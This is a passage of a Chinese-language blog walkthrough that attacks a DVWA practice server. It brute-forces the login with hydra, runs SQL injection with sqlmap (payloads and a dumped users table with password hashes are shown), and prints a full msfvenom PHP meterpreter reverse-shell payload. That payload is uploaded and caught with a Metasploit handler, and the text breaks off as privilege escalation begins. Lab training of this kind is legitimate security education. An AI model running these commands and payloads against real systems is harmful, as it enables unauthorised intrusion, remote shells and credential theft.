<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>整合一下，需要执行的指令就是下面这个了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span class="s2">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>它很快就会给你破解出来</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-49-15.png" alt=""></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-50-18.png" alt=""></p>
<p>由上图可看出，密码就是<code>password</code></p>
<p>接下来我们尝试登录</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-51-58.png" alt=""></p>
<p>如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
<img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-54-11.png" alt=""></p>
<h3 id="第二关简单sql注入">第二关|简单SQL注入</h3>
<p>第一关过了以后，我们要看看它的数据库里面有什么</p>
<h4 id="抓包-1">抓包</h4>
<p>我们回到他这个网页，先进入<code>DVWA Security</code>，把安全等级改成<code>Low</code></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-11-42.png" alt=""></p>
<p>再点击<code>SQL Injection</code>这个按钮，进入这个页面。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_12-55-19.png" alt=""></p>
<p>接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）</p>
<p>在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个<code>Submit</code>按钮，Burp就会自动抓包了</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-12-22.png" alt=""></p>
<p>将它保存为一个txt文件，但是要记住它的位置，比如我的是<code>~/get.txt</code></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_12-58-29.png" alt=""></p>
<p>这样抓包工作就完成了。</p>
<h4 id="使用sqlmap注入">使用sqlmap注入</h4>
<p>接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频</p>
<p>我们先扫描一下注入点</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;get.txt&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-17-27.png" alt=""></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-18-06.png" alt=""></p>
<p>这里均选<code>y</code>即可。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-18-59.png" alt=""></p>
<p>最后一个选项选<code>n</code>不必浪费时间了。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-19-51.png" alt=""></p>
<p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Parameter: id (GET)
</span></span><span class="line"><span class="cl">    Type: boolean-based blind
</span></span><span class="line"><span class="cl">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: error-based
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: time-based blind
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: UNION query
</span></span><span class="line"><span class="cl">    Title: MySQL UNION query (NULL) - 2 columns
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] the back-end DBMS is MySQL
</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;= 4.1
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;~/get.txt&#34;</span> --dump
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-26-48.png" alt=""></p>
<p>出来了。</p>
<p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Database: dvwa
</span></span><span class="line"><span class="cl">Table: users
</span></span><span class="line"><span class="cl">[5 entries]
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| user_id | user    | avatar                                                | password                                    | last_name | first_name |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
</span></span><span class="line"><span class="cl">| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
</span></span><span class="line"><span class="cl">| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
</span></span><span class="line"><span class="cl">| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
</span></span><span class="line"><span class="cl">| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
<p>Well,</p>
<p>接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。</p>
<p>知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。</p>
<p>这次也将使用PHP文件作为<strong>木马</strong>进行攻击。</p>
<h4 id="生成木马">生成木马</h4>
<p>我们用 <strong><code>msfvenom</code></strong> 这个命令来生成。执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.106 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o test.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-35-25.png" alt=""></p>
<p>这样就生成好了。来看看里面有什么？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只有一行～！这一行就是嘿嘿。。。自己看啦</p>
<p>我们加一些html上去吧:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;meta charset=&#34;utf-8&#34; /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;h1&gt;Hacked&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>接下来回到DVWA，在左下角点击 <strong><code>upload</code></strong> 进入上传页面，然后点击 <strong><code>选择文件</code></strong> 再点击 <strong><code>upload</code></strong> 即可。</p>
<p>将这个文件上传进去。</p>
<p>如果这都不会我就不多说了，<strong>你连上传个文件都不会还想进锏幕？</strong></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-42-57.png" alt=""></p>
<p>然后我们可以看到这么一串东西。</p>
<p><strong><code>../../hackable/uploads/test.php succesfully uploaded!</code></strong></p>
<p>说明你上传成功了，接下来要用到<strong>msf</strong></p>
<p>我们在终端进入msf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>不多讲了，走个命令流程，之前写过</p>
<p>调用模块:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span></code></pre></td></tr></table>
</div>
</div><p>按顺序执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 192.168.0.106
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行完后，如图:</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-54-05.png" alt=""></p>
<p>接下来，我们会到浏览器，直接访问<code>http://192.168.0.105/dvwa/hackable/uploads/test.php</code></p>
<p>这时，msf会收到反弹，如图:</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-58-26.png" alt=""></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-58-47.png" alt=""></p>
<p>可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决</p>
<h3 id="第四关获取root权限">第四关|获取root权限</h3>
<p>你能做到这里说明你已经不是萌新了，最后一关：提权</p>
<p>这是最关键的一环，那么我们开始吧。</p>
<p>首先把我们刚刚获取的webshell放到后台:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
